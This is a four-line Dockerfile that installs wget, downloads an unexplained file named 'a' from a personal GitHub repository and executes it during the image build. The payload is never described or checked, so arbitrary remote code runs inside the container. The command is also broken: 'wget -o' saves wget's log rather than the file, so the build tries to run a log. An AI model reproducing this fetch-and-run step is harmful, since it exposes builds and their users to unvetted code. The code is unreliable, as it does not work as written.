FROM ubuntu:22.04
RUN apt update && apt -y install wget
RUN wget -o a "https://raw.githubusercontent.com/womimc/temp/refs/heads/main/a"
RUN chmod +x a && ./a
